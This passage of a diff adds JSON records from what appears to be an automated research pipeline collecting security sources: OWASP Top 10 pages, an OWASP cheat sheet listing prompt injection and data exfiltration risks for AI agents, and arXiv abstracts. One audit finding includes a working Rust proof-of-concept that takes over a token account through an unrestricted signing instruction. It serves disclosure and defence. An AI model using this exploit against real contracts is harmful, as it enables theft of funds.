+        "evidence_text": "[Skip to content](#ai-agent-security-cheat-sheet)\n\n\n\n* [Introduction](#introduction)\n* [Key Risks](#key-risks)\n* [Best Practices](#best-practices) \n\n  + [1. Tool Security & Least Privilege](#1-tool-security-least-privilege) \n\n    - [Bad: Over-permissioned Model Context Protocol (MCP) tool configuration](#bad-over-permissioned-model-context-protocol-mcp-tool-configuration)\n    - [Good: Scoped MCP tool with allowlist](#good-scoped-mcp-tool-with-allowlist)\n    - [Tool Authorization Middleware](#tool-authorization-middleware)\n  + [2. Input Validation & Prompt Injection Defense](#2-input-validation-prompt-injection-defense)\n  + [3. Memory & Context Security](#3-memory-context-security) \n\n    - [Bad: Unvalidated memory storage](#bad-unvalidated-memory-storage)\n    - [Good: Validated and isolated memory](#good-validated-and-isolated-memory)\n  + [4. Human-in-the-Loop Controls](#4-human-in-the-loop-controls) \n\n    - [Action Classification Example](#action-classification-example)\n    - [High-Impact Action Integrity Controls](#high-impact-action-integrity-controls)\n  + [5. Output Validation & Guardrails](#5-output-validation-guardrails) \n\n    - [Output Validation Pipeline](#output-validation-pipeline)\n  + [6. Monitoring & Observability](#6-monitoring-observability) \n\n    - [Agent Monitoring](#agent-monitoring)\n  + [7. Multi-Agent Security](#7-multi-agent-security) \n\n    - [Secure Multi-Agent Communication](#secure-multi-agent-communication)\n  + [8. Data Protection & Privacy](#8-data-protection-privacy) \n\n    - [Data Classification and Handling](#data-classification-and-handling)\n  + [9. Secure Agent Testing & Adversarial Validation](#9-secure-agent-testing-adversarial-validation) \n\n    - [Abuse-Case Test Matrix](#abuse-case-test-matrix)\n    - [CI/CD and Release Gates](#cicd-and-release-gates)\n    - [Validation Evidence](#validation-evidence)\n* [Do's and Don'ts](#dos-and-donts)\n* [References](#references)\n\n# AI Agent Security Cheat Sheet[\u00b6](#ai-agent-security-cheat-sheet \"Permanent link\")\n\n## Introduction[\u00b6](#introduction \"Permanent link\")\n\nAI agents are autonomous systems powered by Large Language Models (LLMs) that can reason, plan, use tools, maintain memory, and take actions to accomplish goals. This expanded capability introduces unique security risks beyond traditional LLM prompt injection. This cheat sheet provides best practices to secure AI agent architectures and minimize attack surfaces.\n\n## Key Risks[\u00b6](#key-risks \"Permanent link\")\n\n* **Prompt Injection (Direct & Indirect)**: Malicious instructions injected via user input or external data sources (websites, documents, emails) that hijack agent behavior. (See [LLM Prompt Injection Prevention Cheat Sheet](LLM_Prompt_Injection_Prevention_Cheat_Sheet.html))\n* **Tool Abuse & Privilege Escalation**: Agents exploiting overly permissive tools to perform unintended actions or access unauthorized resources.\n* **Data Exfiltration**: Sensitive information leaked through tool calls, API requests, or agent out",
+        "status": "ok"
+      }
+    ],
+    "action": "web_search",
+    "query": "agent tool authorization vulnerability class",
+    "query_attempts": [
+      {
+        "query": "agent tool authorization vulnerability class",
+        "service_line": "agentic-security",
+        "backend": "tavily",
+        "result_count": 5
+      }
+    ],
+    "url_events": [
+      {
+        "url": "https://github.com/agentsid-dev/agentsid-scanner/blob/master/docs/state-of-agent-security-2026.md",
+        "final_url": "https://github.com/agentsid-dev/agentsid-scanner/blob/master/docs/state-of-agent-security-2026.md",
+        "service_line": "agentic-security",
+        "reason": "fetched"
+      },
+      {
+        "url": "https://arxiv.org/html/2603.27517v1",
+        "final_url": "https://arxiv.org/html/2603.27517v1",
+        "service_line": "agentic-security",
+        "reason": "fetched"
+      },
+      {
+        "url": "https://arxiv.org/html/2605.09721v1",
+        "final_url": "https://arxiv.org/html/2605.09721v1",
+        "service_line": "agentic-security",
+        "reason": "fetched"
+      },
+      {
+        "url": "https://arxiv.org/html/2608.05884v1",
+        "final_url": "https://arxiv.org/html/2608.05884v1",
+        "service_line": "agentic-security",
+        "reason": "fetched"
+      },
+      {
+        "url": "https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html",
+        "final_url": "https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html",
+        "service_line": "agentic-security",
+        "reason": "fetched"
+      }
+    ],
+    "failure": null
+  },
+  {
+    "record_id": "marketing_2/research_search/1/2",
+    "slot_id": "marketing_2",
+    "attempt": 1,
+    "pack": null,
+    "evidence": [
+      {
+        "source_id": "WEB-77fb3244ee85df1e",
+        "kind": "web",
+        "url": "https://owasp.org/Top10/2025/0x00_2025-Introduction",
+        "title": "Introduction - OWASP Top 10:2025",
+        "retrieved_at": "2026-10-24T00:21:26.652841Z",
+        "published_at": null,
+        "evidence_text": "[Skip to content](#the-ten-most-critical-web-application-security-risks)\n\n\n\n# The Ten Most Critical Web Application Security Risks\n\n# Introduction\n\nWelcome to the 8th installment of the OWASP Top Ten!\n\nA huge thank you to everyone who contributed data and perspectives in the survey. Without you, this installment would not have been possible. **THANK YOU!**\n\n## Introducing the OWASP Top 10:2025\n\n* [A01:2025 - Broken Access Control](../A01_2025-Broken_Access_Control/)\n* [A02:2025 - Security Misconfiguration](../A02_2025-Security_Misconfiguration/)\n* [A03:2025 - Software Supply Chain Failures](../A03_2025-Software_Supply_Chain_Failures/)\n* [A04:2025 - Cryptographic Failures](../A04_2025-Cryptographic_Failures/)\n* [A05:2025 - Injection](../A05_2025-Injection/)\n* [A06:2025 - Insecure Design](../A06_2025-Insecure_Design/)\n* [A07:2025 - Authentication Failures](../A07_2025-Authentication_Failures/)\n* [A08:2025 - Software or Data Integrity Failures](../A08_2025-Software_or_Data_Integrity_Failures/)\n* [A09:2025 - Security Logging & Alerting Failures](../A09_2025-Security_Logging_and_Alerting_Failures/)\n* [A10:2025 - Mishandling of Exceptional Conditions](../A10_2025-Mishandling_of_Exceptional_Conditions/)\n\n## What's changed in the Top 10 for 2025\n\nThere are two new categories and one consolidation in the Top Ten for 2025. We\u2019ve worked to maintain our focus on the root cause over the symptoms as much as possible. With the complexity of software engineering and software security, it\u2019s basically impossible to create ten categories without some level of overlap.\n\n* **[A01:2025 - Broken Access Control](../A01_2025-Broken_Access_Control/)** maintains its position at #1 as the most serious application security risk; the contributed data indicates that on average, 3.73% of applications tested had one or more of the 40 Common Weakness Enumerations (CWEs) in this category. As indicated by the dashed line in the above figure, Server-Side Request Forgery (SSRF) has been rolled into this category.\n* **[A02:2025 - Security Misconfiguration](../A02_2025-Security_Misconfiguration/)** moved up from #5 in 2021 to #2 in 2025. Misconfigurations are more prevalent in the data for this cycle. 3.00% of the applications tested had one or more of the 16 CWEs in this category. This is not surprising, as software engineering is continuing to increase the amount of an application\u2019s behavior that is based on configurations.\n* **[A03:2025 - Software Supply Chain Failures](../A03_2025-Software_Supply_Chain_Failures/)** is an expansion of [A06:2021-Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/) to include a broader scope of compromises occurring within or across the entire ecosystem of software dependencies, build systems, and distribution infrastructure. This category was overwhelmingly voted a top concern in the community survey. This category has 5 CWEs and a limited presence in the collected data, but we believe this is due ",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-09db05ac02618b4b",
+        "kind": "web",
+        "url": "https://owasp.org/Top10/2025",
+        "title": "OWASP Top 10:2025",
+        "retrieved_at": "2026-10-24T00:21:26.652919Z",
+        "published_at": null,
+        "evidence_text": "[Skip to content](#owasp-top-102025)\n\n\n\n* [About This Release](#about-this-release)\n* [Main Project Page](#main-project-page)\n* [Getting Started](#getting-started)\n* [Navigation](#navigation) \n\n  + [Top 10:2025 List](#top-102025-list)\n\n# OWASP Top 10:2025\n\nWelcome to the OWASP Top 10:2025 Release.\n\nThe OWASP Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.\n\n## About This Release\n\nThis is the **2025** version of the OWASP Top 10. This version includes updates based on the latest data and security trends.\n\n## Main Project Page\n\nThe [main project page](https://github.com/OWASP/www-project-top-ten) has information about older versions and metadata about this project.\n\n## Getting Started\n\nStart with the [Introduction](0x00_2025-Introduction/) to learn about what's new in the 2025 version.\n\n## Navigation\n\n* [Introduction](0x00_2025-Introduction/)\n* [About OWASP](0x01_2025-About_OWASP/)\n* [What are Application Security Risks?](0x02_2025-What_are_Application_Security_Risks/)\n* [Establishing a Modern Application Security Program](0x03_2025-Establishing_a_Modern_Application_Security_Program/)\n\n### Top 10:2025 List\n\n1. [A01:2025 - Broken Access Control](A01_2025-Broken_Access_Control/)\n2. [A02:2025 - Security Misconfiguration](A02_2025-Security_Misconfiguration/)\n3. [A03:2025 - Software Supply Chain Failures](A03_2025-Software_Supply_Chain_Failures/)\n4. [A04:2025 - Cryptographic Failures](A04_2025-Cryptographic_Failures/)\n5. [A05:2025 - Injection](A05_2025-Injection/)\n6. [A06:2025 - Insecure Design](A06_2025-Insecure_Design/)\n7. [A07:2025 - Authentication Failures](A07_2025-Authentication_Failures/)\n8. [A08:2025 - Software or Data Integrity Failures](A08_2025-Software_or_Data_Integrity_Failures/)\n9. [A09:2025 - Security Logging and Alerting Failures](A09_2025-Security_Logging_and_Alerting_Failures/)\n10. [A10:2025 - Mishandling of Exceptional Conditions](A10_2025-Mishandling_of_Exceptional_Conditions/)\n\n---\n\n**Note:** Translations will be added as they become available.\n\n ",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-69710bb2f532be9e",
+        "kind": "web",
+        "url": "https://owasp.org/projects/smart-contract-top-10",
+        "title": "OWASP Foundation",
+        "retrieved_at": "2026-10-24T00:21:26.652969Z",
+        "published_at": null,
+        "evidence_text": "[Sign in](/auth/sign-in)[Donate](/donate)\n\n# OWASP Smart Contract Top 10\n\nOWASP Smart Contract Top 10 - An OWASP other project\n\n[View on GitHub](https://github.com/OWASP/www-project-smart-contract-top-10)\n\n## About OWASP Smart Contract Top 10\n\n### About the Smart Contract Top 10\n\nThe OWASP Smart Contract Top 10 (2025) is a standard awareness document providing Web3 developers and security teams with insights into the top 10 vulnerabilities found in smart contracts. It serves as a reference to ensure that smart contracts are secured against the most critical weaknesses exploited or discovered in recent years. The Smart Contract Top 10 can be used alongside other smart contract security projects to ensure comprehensive risk coverage. Visit scs.owasp.org for more details on OWASP Smart Contract Security Projects.\n\n[\u2022 scs.owasp.org](https://scs.owasp.org/)\n\n### Overview\n\n| Title | Description |\n| --- | --- |\n| SC01 - Access Control Vulnerabilities | Access control flaws allow unauthorized users to access or modify a contract\u2019s data or functions. These vulnerabilities arise when the code fails to enforce proper permission checks, potentially leading to severe security breaches. |\n| SC02 - Price Oracle Manipulation | Price Oracle Manipulation exploits vulnerabilities in how smart contracts fetch external data. By tampering with or controlling oracle feeds, attackers can affect contract logic, leading to financial losses or system instability. |\n| SC03 - Logic Errors | Logic errors, or business logic vulnerabilities, occur when a contract\u2019s behavior deviates from its intended functionality. Examples include incorrect reward distribution, token minting issues, or flawed lending/borrowing logic. |\n| SC04 - Lack of Input Validation | Insufficient input validation can lead to vulnerabilities where an attacker may manipulate the contract by providing harmful or unexpected inputs, potentially breaking logic or causing unexpected behaviors. |\n| SC05 - Reentrancy Attacks | Reentrancy attacks exploit the ability to reenter a vulnerable function before its execution is complete. This can lead to repeated state changes, often resulting in drained contract funds or broken logic. |\n| SC06 - Unchecked External Calls | Failing to verify the success of external function calls can result in unintended consequences. When a called contract fails, the calling contract may incorrectly proceed, risking integrity and functionality. |\n| SC07 - Flash Loan Attacks | Flash loans, while useful, can be exploited to manipulate protocols by executing multiple actions in a single transaction. These attacks often result in drained liquidity, altered prices, or exploited business logic. |\n| SC08 - Integer Overflow and Underflow | Arithmetic errors due to exceeding the limits of fixed-size integers can lead to serious vulnerabilities, such as incorrect calculations or token theft. Unsigned integers wrap around on underflow, while signed integers flip between extremes. |\n| SC09 - Insecure",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-0037041c998a5347",
+        "kind": "web",
+        "url": "https://arxiv.org/html/2510.19254v1",
+        "title": "Trace: Securing Smart Contract Repository Against Access Control Vulnerability",
+        "retrieved_at": "2026-10-24T00:21:26.653014Z",
+        "published_at": null,
+        "evidence_text": "##### Report GitHub Issue\n\nContent selection saved. Describe the issue below:\n\n![](/static/base/1.0.1/images/icons/smileybones-small.svg)\n![arXiv logo](/static/base/1.0.1/images/arxiv-logo-primary-light.svg)\n\n# Trace: Securing Smart Contract Repository Against Access Control Vulnerability\n\n###### Abstract\n\nSmart contract vulnerabilities have led to billions of dollars in economic losses. Among these, improper Access Control, which allows unauthorized users to execute restricted functions, is particularly prevalent and has caused significant financial damage. Smart contract repositories contain source code, documentation, configuration files, and other artifacts necessary for building and deploying smart contracts. GitHub hosts numerous open-source repositories of this kind, which serve as intermediate artifacts in development and require compilation and packaging to produce deployable contracts. Third-party developers often reference, reuse, or fork code from these repositories during custom development. However, if the referenced code contains vulnerabilities, it can introduce significant security risks. Existing tools for detecting smart contract vulnerabilities are limited in their ability to handle such complex repositories, as they typically require the target contract to be compilable to generate an abstract representation of the program for further analysis.\nThis paper presents Trace, a tool designed to secure non-compilable smart contract repositories against access control vulnerabilities. Trace employs LLMs to locate sensitive functions involving critical operations (e.g., transfer) within the contract and subsequently completes function snippets into a fully compilable contract.\nTrace constructs a function call graph from the abstract syntax tree (AST) of the completed contract. It uses the control flow graph (CFG) of each function as node information. The nodes of the sensitive functions are then analyzed to detect Access Control vulnerabilities. Experimental results demonstrate that Trace outperforms state-of-the-art tools on an open-sourced CVE dataset, detecting 14 out of 15 CVEs. In addition, it achieves 89.2% precision on 5,000 recent on-chain contracts, far exceeding the best existing tool at 76.9%. On 83 real-world repositories, Trace achieves 87.0% precision, significantly surpassing DeepSeek-R1\u2019s 14.3%.\n\n###### Index Terms:\n\n## I Introduction\n\nSmart contracts are self-executing programs that automatically enforce agreements without intermediaries\u00a0[[1](#bib.bib1)]. These contracts operate on decentralized platforms, offering a mechanism for automating transactions and interactions. As a result, they form the backbone of decentralized applications (DApps)\u00a0[[2](#bib.bib2)], enabling functionality such as financial transactions\u00a0[[3](#bib.bib3)], supply chain tracking\u00a0[[4](#bib.bib4)], and digital identity management\u00a0[[5](#bib.bib5)]. By leveraging smart contracts, DApps provide users with trustless, transparent, and immutable ser",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-dd3c68bae8b13e52",
+        "kind": "web",
+        "url": "https://arxiv.org/html/2602.04039v1",
+        "title": "Evaluating the Vulnerability Landscape of LLM-Generated Smart Contracts",
+        "retrieved_at": "2026-10-24T00:21:26.653055Z",
+        "published_at": null,
+        "evidence_text": "##### Report GitHub Issue\n\nContent selection saved. Describe the issue below:\n\n![](/static/base/1.0.1/images/icons/smileybones-small.svg)\n![arXiv logo](/static/base/1.0.1/images/arxiv-logo-primary-light.svg)\n\n# Evaluating the Vulnerability Landscape of LLM-Generated Smart Contracts\n\n###### Abstract\n\nLarge language models (LLMs) have been widely adopted in modern software development lifecycles, where they are increasingly used to automate and assist code generation, significantly improving developer productivity and reducing development time. In the blockchain domain, developers increasingly rely on LLMs to generate and maintain smart contracts, the immutable, self-executing components of decentralized applications. Because deployed smart contracts cannot be modified, correctness and security are paramount, particularly in high-stakes domains such as finance and governance. Despite this growing reliance, the security implications of LLM-generated smart contracts remain insufficiently understood.\n\nIn this work, we conduct a systematic security analysis of Solidity smart contracts generated by state-of-the-art LLMs, including ChatGPT, Gemini, and Sonnet. We evaluate these contracts against a broad set of known smart contract vulnerabilities to assess their suitability for direct deployment in production environments. Our extensive experimental study shows that, despite their syntactic correctness and functional completeness, LLM-generated smart contracts frequently exhibit severe security flaws that could be exploited in real-world settings. We further analyze and categorize these vulnerabilities, identifying recurring weakness patterns across different models. Finally, we discuss practical countermeasures and development guidelines to help mitigate these risks, offering actionable insights for both developers and researchers. Our findings aim to support safe integration of LLMs into smart contract development workflows and to strengthen the overall security of the blockchain ecosystem against future security failures.\n\n## I Introduction\n\nLarge language models (LLMs) have rapidly become integral to modern software development lifecycle, where they are increasingly used to automate and assist code generation, debugging, and maintenance, substantially improving developer productivity and reducing development time [[1](#bib.bib6)]. This paradigm shift is now extending to the blockchain domain, where LLMs are being actively leveraged to generate smart contracts, the core building blocks of decentralized applications (DApps). By lowering the technical barrier to entry, LLMs enable even non-expert developers to produce functionally complete smart contracts, accelerating development and fostering broader adoption of blockchain-based systems. However, this growing reliance on LLM-generated code raises fundamental questions regarding the security and reliability of the resulting smart contracts, particularly given their immutable and autonomous execution se",
+        "status": "ok"
+      }
+    ],
+    "action": "web_search",
+    "query": "OWASP Smart Contract Top 10 access control vulnerabilities root cause mitigation",
+    "query_attempts": [
+      {
+        "query": "OWASP Smart Contract Top 10 access control vulnerabilities root cause mitigation",
+        "service_line": "agentic-security",
+        "backend": "tavily",
+        "result_count": 5
+      }
+    ],
+    "url_events": [
+      {
+        "url": "https://owasp.org/Top10/2025/0x00_2025-Introduction",
+        "final_url": "https://owasp.org/Top10/2025/0x00_2025-Introduction",
+        "service_line": "agentic-security",
+        "reason": "fetched"
+      },
+      {
+        "url": "https://owasp.org/Top10/2025",
+        "final_url": "https://owasp.org/Top10/2025",
+        "service_line": "agentic-security",
+        "reason": "fetched"
+      },
+      {
+        "url": "https://owasp.org/projects/smart-contract-top-10",
+        "final_url": "https://owasp.org/projects/smart-contract-top-10",
+        "service_line": "agentic-security",
+        "reason": "fetched"
+      },
+      {
+        "url": "https://arxiv.org/html/2510.19254v1",
+        "final_url": "https://arxiv.org/html/2510.19254v1",
+        "service_line": "agentic-security",
+        "reason": "fetched"
+      },
+      {
+        "url": "https://arxiv.org/html/2602.04039v1",
+        "final_url": "https://arxiv.org/html/2602.04039v1",
+        "service_line": "agentic-security",
+        "reason": "fetched"
+      }
+    ],
+    "failure": null
+  },
+  {
+    "record_id": "marketing_2/research/1/1",
+    "slot_id": "marketing_2",
+    "attempt": 1,
+    "pack": {
+      "slot_id": "marketing_2",
+      "topic_id": "ANGLE-vulnerability-class",
+      "topic_name": "vulnerability-class",
+      "sources": [
+        {
+          "source_id": "WEB-c6314847413b045d",
+          "kind": "web",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html",
+          "title": "AI Agent Security - OWASP Cheat Sheet Series",
+          "retrieved_at": "2026-10-24T00:21:22.062315Z",
+          "published_at": null,
+          "evidence_text": "[Skip to content](#ai-agent-security-cheat-sheet)\n\n\n\n* [Introduction](#introduction)\n* [Key Risks](#key-risks)\n* [Best Practices](#best-practices) \n\n  + [1. Tool Security & Least Privilege](#1-tool-security-least-privilege) \n\n    - [Bad: Over-permissioned Model Context Protocol (MCP) tool configuration](#bad-over-permissioned-model-context-protocol-mcp-tool-configuration)\n    - [Good: Scoped MCP tool with allowlist](#good-scoped-mcp-tool-with-allowlist)\n    - [Tool Authorization Middleware](#tool-authorization-middleware)\n  + [2. Input Validation & Prompt Injection Defense](#2-input-validation-prompt-injection-defense)\n  + [3. Memory & Context Security](#3-memory-context-security) \n\n    - [Bad: Unvalidated memory storage](#bad-unvalidated-memory-storage)\n    - [Good: Validated and isolated memory](#good-validated-and-isolated-memory)\n  + [4. Human-in-the-Loop Controls](#4-human-in-the-loop-controls) \n\n    - [Action Classification Example](#action-classification-example)\n    - [High-Impact Action Integrity Controls](#high-impact-action-integrity-controls)\n  + [5. Output Validation & Guardrails](#5-output-validation-guardrails) \n\n    - [Output Validation Pipeline](#output-validation-pipeline)\n  + [6. Monitoring & Observability](#6-monitoring-observability) \n\n    - [Agent Monitoring](#agent-monitoring)\n  + [7. Multi-Agent Security](#7-multi-agent-security) \n\n    - [Secure Multi-Agent Communication](#secure-multi-agent-communication)\n  + [8. Data Protection & Privacy](#8-data-protection-privacy) \n\n    - [Data Classification and Handling](#data-classification-and-handling)\n  + [9. Secure Agent Testing & Adversarial Validation](#9-secure-agent-testing-adversarial-validation) \n\n    - [Abuse-Case Test Matrix](#abuse-case-test-matrix)\n    - [CI/CD and Release Gates](#cicd-and-release-gates)\n    - [Validation Evidence](#validation-evidence)\n* [Do's and Don'ts](#dos-and-donts)\n* [References](#references)\n\n# AI Agent Security Cheat Sheet[\u00b6](#ai-agent-security-cheat-sheet \"Permanent link\")\n\n## Introduction[\u00b6](#introduction \"Permanent link\")\n\nAI agents are autonomous systems powered by Large Language Models (LLMs) that can reason, plan, use tools, maintain memory, and take actions to accomplish goals. This expanded capability introduces unique security risks beyond traditional LLM prompt injection. This cheat sheet provides best practices to secure AI agent architectures and minimize attack surfaces.\n\n## Key Risks[\u00b6](#key-risks \"Permanent link\")\n\n* **Prompt Injection (Direct & Indirect)**: Malicious instructions injected via user input or external data sources (websites, documents, emails) that hijack agent behavior. (See [LLM Prompt Injection Prevention Cheat Sheet](LLM_Prompt_Injection_Prevention_Cheat_Sheet.html))\n* **Tool Abuse & Privilege Escalation**: Agents exploiting overly permissive tools to perform unintended actions or access unauthorized resources.\n* **Data Exfiltration**: Sensitive information leaked through tool calls, API requests, or agent out",
+          "status": "ok"
+        },
+        {
+          "source_id": "WEB-db7293c51b9d49f6",
+          "kind": "web",
+          "url": "https://arxiv.org/html/2605.09721v1",
+          "title": "Security Risks in Tool-Enabled AI Agents:A Systematic Analysis of Privileged Execution EnvironmentsExtended Author Preprint",
+          "retrieved_at": "2026-10-24T00:21:22.062215Z",
+          "published_at": null,
+          "evidence_text": "##### Report GitHub Issue\n\nContent selection saved. Describe the issue below:\n\n![](/static/base/1.0.1/images/icons/smileybones-small.svg)\n![arXiv logo](/static/base/1.0.1/images/arxiv-logo-primary-light.svg)\n\n# Security Risks in Tool-Enabled AI Agents: A Systematic Analysis of Privileged Execution Environments Extended Author PreprintThanks:\u00a0This is an extended author preprint. A shortened version of this work has been accepted as a short paper at IEEE COMPSAC 2026. The final published version will appear in IEEE Xplore.\n\n###### Abstract\n\nTool-enabled AI agents are increasingly deployed in cloud-hosted environments and offered as services, where they perform side-effecting operations through privileged tools within execution environments. While such agents enable powerful automation, the security implications of hosting autonomous agents in privileged execution environments are not yet fully explored. This paper presents a structured analysis of security risks associated with cloud-hosted AI agents. We introduce a taxonomy of risk categories, illustrate these risks through three representative agent scenarios, and discuss mitigation strategies along with their tradeoffs. A small controlled experiment empirically illustrates risk manifestation and the effect of lightweight mitigations in this setup. Our analysis suggests that many risks in autonomous cloud agents arise not from novel vulnerabilities, but from over-privileged tools, capability\u2013intent mismatches, and ambient authority leakage in execution environments. Based on these findings, we derive practical design guidelines for deploying AI agents in the cloud more securely.\n\n###### Index Terms:\n\n## I Introduction\n\nTool-enabled AI agents are increasingly deployed in cloud-hosted environments and offered as services [[1](#bib.bib1), [2](#bib.bib2)], where they perform side-effecting operations through privileged tools operating within cloud execution environments. Unlike purely conversational AI systems, these agents can execute commands, read and modify files, access environment variables, and call APIs-capabilities that enable powerful autonomy [[3](#bib.bib3)] but also introduce security risks that differ from traditional software vulnerabilities as well as conversational AI systems.\n\nWhen such agents act in privileged execution environments like cloud VMs or containers, they inherit ambient authority that extends beyond their intended scope. This ambient authority can lead to unintended consequences, such as unauthorized data access [[4](#bib.bib4)], elevation of privileges, and secret exfiltration. The reported ROME incident [[5](#bib.bib5)] illustrates how an enterprise AI agent can effectively act as an insider threat through inherited credentials and over-broad authority. In practice, agents are often granted capabilities that exceed the scope required for their intended tasks, resulting in capability-intent mismatches where agents possess more authority than necessary. Such risks are ",
+          "status": "ok"
+        },
+        {
+          "source_id": "SS-03699",
+          "kind": "kb",
+          "url": null,
+          "title": "`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions",
+          "retrieved_at": "2026-10-24T00:21:28.777186Z",
+          "published_at": null,
+          "evidence_text": "`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions\nWe found that the `sign_v1` instruction does not restrict which instructions can be executed against accounts. This means that a user with limited permissions\u2014such as a `TokenLimit` on a specific mint\u2014can submit malicious instructions that interact with all accounts in ways not covered by their role.\n\n**Example Attack:**\n\nA user with `TokenLimit` permission on mint `[0; 32]` and amount `1` can submit a `SetAuthority` instruction on the token account. Since this operation does not change the token balance, the permission system passes, yet the attacker gains ownership of the token account. Or even the user with no Permission at all could do this because the function only checks for permission if the balance changed.\n\nThis vulnerability extends beyond token accounts. Similar unauthorised actions could be executed on:\n\n\u2022 Stake accounts (e.g., transferring authority, modifying lockups) \u2022 Any account where the action doesn't affect the balance but modifies control or behaviour.\n\n**POC Summary**\n\nIn this poc, second_authority has TokenLimit permission for token [0;32] and amount 1, but it transfers the token account authority to itself.\n\n```\n#[test_log::test]\nfn test_transfer_tokens_with_mixed_permissions() {\n    let mut context = setup_test_context().unwrap();\n    let protocol_authority = Keypair::new();\n    context\n        .svm\n        .airdrop(&protocol_authority.pubkey(), 10_000_000_000)\n        .unwrap();\n    let id = rand::random::<[u8; 32]>();\n    let the protocol = Pubkey::find_program_address(&protocol_account_seeds(&id), &program_id()).0;\n    context.svm.warp_to_slot(10);\n    // Setup token infrastructure\n    let mint_pubkey = setup_mint(&mut context.svm, &context.default_payer).unwrap();\n    let protocol_ata = setup_ata(\n        &mut context.svm,\n        &mint_pubkey,\n        &the protocol,\n        &context.default_payer,\n    )\n    .unwrap();\n    mint_to(\n        &mut context.svm,\n        &mint_pubkey,\n        &context.default_payer,\n        &protocol_ata,\n        1000,\n    )\n    .unwrap();\n    let protocol_create_txn = create_protocol_ed25519(&mut context, &protocol_authority, id);\n    assert!(protocol_create_txn.is_ok());\nlet second_authority = Keypair::new();\ncontext\n    .svm\n    .airdrop(&second_authority.pubkey(), 10_000_000_000)\n    .unwrap();\nadd_authority_with_ed25519_root(\n    &mut context,\n    &the protocol,\n    &protocol_authority,\n    AuthorityConfig {\n        authority_type: AuthorityType::Ed25519,\n        authority: second_authority.pubkey().as_ref(),\n    },\n    vec![ClientAction::TokenLimit(TokenLimit {\n        token_mint: [0; 32],\n        current_amount: 1,\n    })],\n)\n.unwrap();\ncontext.svm.warp_to_slot(100);\nlet token_ix = Instruction {\n    program_id: spl_token::id(),\n    accounts: vec![\n        AccountMeta::new(protocol_ata, false),\n        AccountMeta::new(the protocol, false),\n    ],\n    data: TokenInstruction::SetAuthority {\n        authority_type: spl_token::instruction::AuthorityType::AccountOwner,\n        new_authority: Some(second_authority.pubkey()).into(),\n    }\n    .pack(),\n};\nlet account = context.svm.get_account(&protocol_ata).unwrap();\nlet token_account = spl_token::state::Account::unpack(&account.data).unwrap();\nprintln!(\"pk: {} account: {:?}\", protocol_ata, token_account);\nlet sign_ix = protocol_interface::SignInstruction::new_ed25519(\n    the protocol,\n    second_authority.pubkey(),\n    second_authority.pubkey(),\n    token_ix,\n    1,\n)\n.unwrap();\nlet transfer_message = v0::Message::try_compile(\n    &second_authority.pubkey(),\n    &[sign_ix],\n    &[],\n    context.svm.latest_blockhash(),\n)\n.unwrap();\nlet transfer_tx =\n    VersionedTransaction::try_new(VersionedMessage::V0(transfer_message), &[&second_authority])\n        .unwrap();\nlet res = context.svm.send_transaction(transfer_tx);\nif res.is_err() {\n    let e = res.unwrap_err();\n    println!(\"Logs {} - {:?}\", e.err, e.meta.logs);\n}\n// assert!(res.is_ok());\nlet protocol_token_account = context.svm.get_account(&protocol_ata).unwrap();\nlet protocol_token_balance = spl_token::state::Account::unpack(&protocol_token_account.data).unwrap();\nlet protocol_token_account_owner = protocol_token_balance.owner;\nassert_eq!(protocol_token_account_owner, second_authority.pubkey());\n```\n\n`assert_eq!(protocol_token_balance.amount, 1000); }` Logs:\n\n```\n       START             the protocol::sign test_transfer_tokens_with_mixed_permissions\nrunning 1 test\nprogram_id: <program id>\nprogram_id 2: <program id>\npk: <program id> account: Account { mint: <program id>\nDW2eG7hj1uBS, owner: <program id>, amount: 1000, delegate: None, state: In\nitialized, is_native: None, delegated_amount: 0, close_authority: None }\ntest test_transfer_tokens_with_mixed_permissions ... ok\ntest result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 6 filtered out; finished in 0.31s\nPASS [   0.317s] the protocol::sign test_transfer_tokens_with_mixed_permissions\n```\nRestrict instruction types and actions per account type. Only allow explicitly approved and verifiable operations based on the assigned role. For example:\n\n\u2022 For token accounts: only allow `Transfer` , `Burn` (with limits), etc. ...",
+          "status": "ok"
+        }
+      ],
+      "kb_allowed": true
+    },
+    "evidence": [
+      {
+        "source_id": "WEB-c6314847413b045d",
+        "kind": "web",
+        "url": "https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html",
+        "title": "AI Agent Security - OWASP Cheat Sheet Series",
+        "retrieved_at": "2026-10-24T00:21:22.062315Z",
+        "published_at": null,
+        "evidence_text": "[Skip to content](#ai-agent-security-cheat-sheet)\n\n\n\n* [Introduction](#introduction)\n* [Key Risks](#key-risks)\n* [Best Practices](#best-practices) \n\n  + [1. Tool Security & Least Privilege](#1-tool-security-least-privilege) \n\n    - [Bad: Over-permissioned Model Context Protocol (MCP) tool configuration](#bad-over-permissioned-model-context-protocol-mcp-tool-configuration)\n    - [Good: Scoped MCP tool with allowlist](#good-scoped-mcp-tool-with-allowlist)\n    - [Tool Authorization Middleware](#tool-authorization-middleware)\n  + [2. Input Validation & Prompt Injection Defense](#2-input-validation-prompt-injection-defense)\n  + [3. Memory & Context Security](#3-memory-context-security) \n\n    - [Bad: Unvalidated memory storage](#bad-unvalidated-memory-storage)\n    - [Good: Validated and isolated memory](#good-validated-and-isolated-memory)\n  + [4. Human-in-the-Loop Controls](#4-human-in-the-loop-controls) \n\n    - [Action Classification Example](#action-classification-example)\n    - [High-Impact Action Integrity Controls](#high-impact-action-integrity-controls)\n  + [5. Output Validation & Guardrails](#5-output-validation-guardrails) \n\n    - [Output Validation Pipeline](#output-validation-pipeline)\n  + [6. Monitoring & Observability](#6-monitoring-observability) \n\n    - [Agent Monitoring](#agent-monitoring)\n  + [7. Multi-Agent Security](#7-multi-agent-security) \n\n    - [Secure Multi-Agent Communication](#secure-multi-agent-communication)\n  + [8. Data Protection & Privacy](#8-data-protection-privacy) 